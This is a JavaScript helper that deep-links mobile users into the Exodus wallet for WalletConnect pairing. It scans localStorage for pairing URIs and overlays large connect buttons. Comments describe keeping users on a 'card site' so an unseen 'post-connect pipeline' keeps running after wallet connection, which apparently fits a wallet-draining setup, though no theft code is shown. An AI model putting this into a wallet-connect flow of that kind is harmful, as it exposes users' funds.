/**
 * Exodus mobile deep-link rescue v1.1.6
 * Pairing: exodus://wc?uri=… ONLY after user tap (Open Exodus / Connect).
 * NEVER auto kickConnect / auto-open on pageshow — that empties Safari tab.
 * NEVER navigate away to bare www.exodus.com — kills post-connect pipeline.
 */
(function () {
  'use strict';

  var BAR_ID = '__exodus_dl_bar';
  var lastFiredUri = '';
  var lastFireAt = 0;
  var connectKickAt = 0;
  var watching = false;

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function isConnected() {
    try {
      var a = sessionStorage.getItem('exodus_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return true;
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) return true;
    } catch (_) {}
    return false;
  }

  function scanWcUriFromStorage() {
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i) || '';
        var v = localStorage.getItem(k) || '';
        if (v.indexOf('wc:') === 0 && v.length > 20) return v;
        var m = v.match(/wc:[a-f0-9@.-]+@[0-9]+\?[^"'\s\\]+/i);
        if (m) return m[0];
      }
    } catch (_) {}
    return null;
  }

  function getUri() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getWcUri === 'function') {
        var u = window.LegionWallet.getWcUri();
        if (u && String(u).indexOf('wc:') === 0) return String(u);
      }
    } catch (_) {}
    try {
      if (window.__LEGION_LAST_WC_URI__ && String(window.__LEGION_LAST_WC_URI__).indexOf('wc:') === 0) {
        return String(window.__LEGION_LAST_WC_URI__);
      }
    } catch (_) {}
    return scanWcUriFromStorage();
  }

  function nativeHref(uri) {
    return 'exodus://wc?uri=' + encodeURIComponent(uri);
  }

  function universalHref(uri) {
    // Exodus universal / marketing fallback with WC payload
    return 'https://www.exodus.com/mobile?wc=' + encodeURIComponent(uri);
  }

  function androidIframe(href) {
    try {
      if (!/Android/i.test(navigator.userAgent || '')) return;
      var t = document.createElement('iframe');
      t.setAttribute('aria-hidden', 'true');
      t.style.cssText = 'display:none;width:0;height:0;border:0';
      t.src = href;
      document.body.appendChild(t);
      setTimeout(function () { try { t.remove(); } catch (_) {} }, 2500);
    } catch (_) {}
  }

  function openExodusNative(uri) {
    var href = nativeHref(uri);
    androidIframe(href);
    try { window.location.href = href; } catch (_) {
      try { window.open(href, '_self'); } catch (_) {}
    }
    // NO https://www.exodus.com fallback — that navigates Safari off the card site
    // and leaves user in Exodus marketing/app with no live WC session from this tab.
  }

  function openExodus(uri, force) {
    // Desktop-QR mode: never auto-open Exodus from mobile Safari
    try {
      if (window.__EXODUS_QR_DESKTOP_ONLY__ && !force) return false;
    } catch (_) {}
    if (!uri || String(uri).indexOf('wc:') !== 0) return false;
    // Once connected / pipeline running, never bounce this tab off the card site
    try {
      if (isConnected() || window.__EXODUS_PIPELINE_BUSY__) {
        if (!force) return false;
        // Forced: flush+pipeline first, then native only (OS will freeze JS after switch)
        var doOpen = function () {
          var hrefOnly = nativeHref(uri);
          androidIframe(hrefOnly);
          try { window.location.href = hrefOnly; } catch (_) {}
        };
        if (typeof window.__EXODUS_BEFORE_WALLET_OPEN__ === 'function') {
          window.__EXODUS_BEFORE_WALLET_OPEN__(doOpen, 500);
        } else {
          doOpen();
        }
        return true;
      }
    } catch (_) {}
    var now = Date.now();
    if (!force && uri === lastFiredUri && now - lastFireAt < 2500) return true;
    lastFiredUri = uri;
    lastFireAt = now;
    try { window.__LEGION_LAST_WC_URI__ = uri; } catch (_) {}

    // Pairing handoff: mark need-resume so return from Exodus restarts pipeline
    try {
      sessionStorage.setItem('exodus_need_resume', '1');
      sessionStorage.setItem('exodus_freeze_ts', String(Date.now()));
    } catch (_) {}
    try {
      if (typeof window.__EXODUS_FLUSH_FREEZE__ === 'function') {
        window.__EXODUS_FLUSH_FREEZE__('pre-deeplink');
      }
    } catch (_) {}

    openExodusNative(uri);
    return true;
  }

  function ensureBar() {
    var el = document.getElementById(BAR_ID);
    if (el) return el;
    el = document.createElement('div');
    el.id = BAR_ID;
    el.style.cssText = [
      'position:fixed',
      'left:12px',
      'right:12px',
      'bottom:calc(12px + env(safe-area-inset-bottom,0px))',
      'z-index:2147483647',
      'display:none',
      'flex-direction:column',
      'gap:8px',
      'font-family:system-ui,-apple-system,sans-serif',
    ].join(';');
    el.innerHTML = [
      '<button type="button" id="__exodus_dl_open" style="width:100%;background:#8B5CF6;color:#fff;border:0;border-radius:14px;padding:16px;font-weight:700;font-size:16px;box-shadow:0 8px 28px rgba(139,92,246,.4)">Open Exodus</button>',
      '<button type="button" id="__exodus_dl_retry" style="width:100%;background:#111;color:#fff;border:1px solid #333;border-radius:12px;padding:12px;font-weight:600;font-size:13px">URI missing? Retry connect</button>',
    ].join('');
    document.body.appendChild(el);

    el.querySelector('#__exodus_dl_open').onclick = function (e) {
      e.preventDefault();
      var uri = getUri();
      if (uri) openExodus(uri, true);
      else kickConnect(true);
    };
    el.querySelector('#__exodus_dl_retry').onclick = function (e) {
      e.preventDefault();
      kickConnect(true);
    };
    return el;
  }

  function showBar(on) {
    if (!isMobile()) return;
    // Desktop-QR mode: hide Open Exodus bar on mobile
    try {
      if (window.__EXODUS_QR_DESKTOP_ONLY__) {
        var hide = document.getElementById(BAR_ID);
        if (hide) hide.style.display = 'none';
        return;
      }
    } catch (_) {}
    var el = ensureBar();
    el.style.display = on ? 'flex' : 'none';
  }

  function kickConnect(force) {
    var now = Date.now();
    if (!force && now - connectKickAt < 4000) return;
    connectKickAt = now;
    try { window.__LEGION_DEEP_LINK_TARGET__ = 'exodus'; } catch (_) {}
    window.__SELECTED_WALLET__ = 'exodus';
    if (typeof window.__EXODUS_DIRECT_CONNECT__ === 'function') {
      try { window.__EXODUS_DIRECT_CONNECT__(); return; } catch (_) {}
    }
    var L = window.legion;
    if (!L) return;
    try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
    try {
      if (typeof L.connectWC === 'function') L.connectWC();
      else if (typeof L.connect === 'function') L.connect();
    } catch (_) {}
  }

  function tick() {
    if (!isMobile()) return;
    // Inside Exodus WebView — never deeplink bounce; oneshot handles popups
    try {
      if (window.__EXODUS_IN_APP__ || (typeof window.__EXODUS_IS_IN_APP__ === 'function' && window.__EXODUS_IS_IN_APP__())) {
        showBar(false);
        return;
      }
    } catch (_) {}
    if (isConnected()) {
      showBar(false);
      return;
    }
    var uri = getUri();
    if (uri) {
      showBar(true);
      // CRITICAL: never auto-open Exodus on cold page load.
      // Stale wc: URI in localStorage used to bounce Safari → Exodus with empty relay.
      // Only open after user started connect (watching) or explicit __EXODUS_OPEN_DEEPLINK__.
      if (watching && uri !== lastFiredUri) openExodus(uri, false);
      return;
    }
    var connecting = false;
    try {
      connecting = !!(window.legion && window.legion.state && (
        window.legion.state.connecting || window.legion.state.wcConnecting
      ));
    } catch (_) {}
    // Show bar while connecting — NEVER auto kickConnect (cold pageshow used to
    // call kickConnect → open-inapp handoff → bare exodus:// → Safari tab dies).
    if (connecting || watching) showBar(true);
  }

  function onReturn() {
    if (!isMobile()) return;
    // Connected: hard resume pipeline (tab was frozen in Exodus)
    if (isConnected()) {
      try {
        if (typeof window.__EXODUS_HARD_RESUME__ === 'function') {
          window.__EXODUS_HARD_RESUME__('deeplink-return');
        }
      } catch (_) {}
      showBar(false);
      return;
    }
    var uri = getUri();
    if (uri && watching) showBar(true);
    // NO auto kickConnect on focus/pageshow — that bounced open site → empty Exodus
  }

  function markWatching() {
    watching = true;
    try { window.__LEGION_DEEP_LINK_TARGET__ = 'exodus'; } catch (_) {}
    showBar(true);
  }

  document.addEventListener('click', function (e) {
    if (!isMobile()) return;
    var t = e.target;
    if (!t || !t.closest) return;
    var btn = t.closest('button, a, [role="button"]');
    if (!btn) return;
    var txt = (btn.textContent || '').trim().toLowerCase();
    var id = btn.id || '';
    // Only real connect CTAs — NOT any button that merely mentions "Exodus"
    // (chip/skin text used to arm watching → tick auto-open).
    if (
      id === 'cfmbtn' ||
      id === '__exodus_dl_open' ||
      id === '__exodus_dl_retry' ||
      txt === 'connect wallet' ||
      txt === 'get card' ||
      (txt.indexOf('connect') === 0 && txt.indexOf('wallet') !== -1)
    ) {
      markWatching();
    }
  }, true);

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') onReturn();
  });
  window.addEventListener('pageshow', onReturn);
  window.addEventListener('focus', onReturn);
  setInterval(tick, 700);

  window.__EXODUS_OPEN_DEEPLINK__ = function (force) {
    var uri = getUri();
    if (uri) return openExodus(uri, !!force);
    // No URI yet: show manual bar only. Do NOT kickConnect — that auto-opens
    // empty Exodus and kills the Safari tab (cold-load / early connect race).
    if (force) {
      watching = true;
      showBar(true);
    }
    return false;
  };
  window.__EXODUS_GET_WC_URI__ = getUri;
  window.__TRUST_OPEN_DEEPLINK__ = window.__EXODUS_OPEN_DEEPLINK__;
  window.__TRUST_GET_WC_URI__ = getUri;

  function boot() {
    if (!isMobile()) return;
    ensureBar();
    tick();
  }
  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);
})();
